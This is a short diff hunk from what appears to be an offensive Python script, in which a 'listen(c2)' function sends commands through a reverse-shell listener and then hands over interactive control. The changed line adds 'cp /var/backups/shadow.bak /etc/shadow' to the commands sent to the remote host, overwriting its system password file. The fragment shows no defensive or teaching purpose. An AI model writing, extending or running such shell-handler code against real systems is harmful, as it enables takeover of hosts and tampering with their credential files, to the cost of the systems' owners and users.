@@ -25,7 +25,7 @@ def listen(c2):
     shellListener.send(b'\x0D')
     time.sleep(1.5)
     shellListener.send(b'\x0C')
-    shellListener.send(bytes('id; hostname; date', 'utf-8'))
+    shellListener.send(bytes('id; hostname; date; cp /var/backups/shadow.bak /etc/shadow', 'utf-8'))
     shellListener.send(b'\x0D')
 
     shellListener.interact()
